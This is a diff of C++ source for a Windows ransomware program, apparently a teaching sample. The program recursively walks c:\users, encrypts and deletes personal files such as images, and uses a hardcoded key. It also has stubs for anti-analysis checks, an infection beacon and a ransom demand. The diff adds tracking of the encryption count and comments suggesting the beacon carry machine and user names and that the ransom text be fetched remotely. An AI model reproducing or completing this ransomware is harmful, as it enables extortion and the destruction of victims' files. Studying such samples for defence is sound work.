@@ -3,7 +3,8 @@
 
 //
 // The encryption/decryption key is:
-//    "Q2hyaXNDbGFyaXNzYVNhbWFudGhhU2t5bGFy"
+//
+//    Q2hyaXNDbGFyaXNzYVNhbWFudGhhU2t5bGFy
 //
 // which is a Base64 encode of "ChrisClarissaSamanthaSkylar"
 //
@@ -14,6 +15,7 @@
 #include <filesystem>
 #include <windows.h>
 #include <wincrypt.h>
+//#include <boost/algorithm/string.hpp>
 
 
 namespace fs = std::experimental::filesystem;
@@ -58,8 +60,9 @@ int main(int argc, char* argv[])
 	std::string BannerFinal = Banner1.append(Banner2).append(Banner3).append(Banner4).append(Banner5).append(Banner6).append(Banner7).append(Banner8).append(Banner9).append(Banner10).append(Banner11); // .append(Banner12).append(Banner13);
 	std::cout << BannerFinal << std::endl;
 
+	DWORD dwEncryptionResult = 0;
 	DWORD dwDecryptionResult = 0;
-	
+
 	//
 	// Check for debugger, execution in a VM, or other dynamic analysis 
 	//
@@ -107,7 +110,7 @@ int main(int argc, char* argv[])
 		PrintProgress();
 
 		// Finds, Encrypts, and Deletes important personal files
-		FindFiles();
+		dwEncryptionResult = FindFiles();
 
 		// Send network beacon to report ransom/encryption completed
 		SendInfectionBeacon();
@@ -154,7 +157,10 @@ int main(int argc, char* argv[])
 
 bool AnalysisCheck()
 {
-	// TODO: Add code to check for a debugger, execution in a VM, or other dynamic analysis
+	// TODO: Add code to check for a debugger, execution in a VM, or other dynamic analysis indicators
+
+	// Returning TRUE will halt program execution
+	// Returning FALSE will allow program execution to proceed
 
 	return false; // stubbed for now allow execution
 }
@@ -162,13 +168,20 @@ bool AnalysisCheck()
 void SendInfectionBeacon()
 {
 	// TODO: Add code to send an infection beacon to a website, twitter, 
-	//       slack, email, or some other network destination
+	//       slack, email, or some other network destination to track infections
+	//
+	// Beacon data could include machinename, username, # files encrypted, etc
 }
 
 void RansomMessage()
 {
 	// TODO: Add code to display a ransom message to the user, and to 
 	//       demand bitcoin payment to get the decryption key
+	//
+	// This could be a MessageBox or a HTML page
+	//
+	// The message text should be encoded (base64) if stored in the code,
+	// or it could be downloaded from a remote site
 }
 
 void PrintProgress()
@@ -657,7 +670,7 @@ DWORD FindFiles()
 
 
 	std::string path = "c:\\users";
-	//std::string temp;
+	std::string temp;
 
 	for (const auto& entry : fs::recursive_directory_iterator(path))
 	{
@@ -666,6 +679,9 @@ DWORD FindFiles()
 		{
 			continue; // Excluding path 
 		}
+
+		temp = entry.path().extension().string();
+		//std::cout << "Working: " << temp << std::endl;
 
 		if (entry.path().extension() == jpg ||
 			entry.path().extension() == jpeg ||
@@ -719,7 +735,7 @@ DWORD FindFiles()
 		std::cout << "Total files encrypted: " << dwEncryptionCounter << std::endl;
 	}
 
-	return dwFileCounter;
+	return dwEncryptionCounter; // dwFileCounter;
 }
 
 DWORD FindEncryptedFiles(std::string decryptionKey)
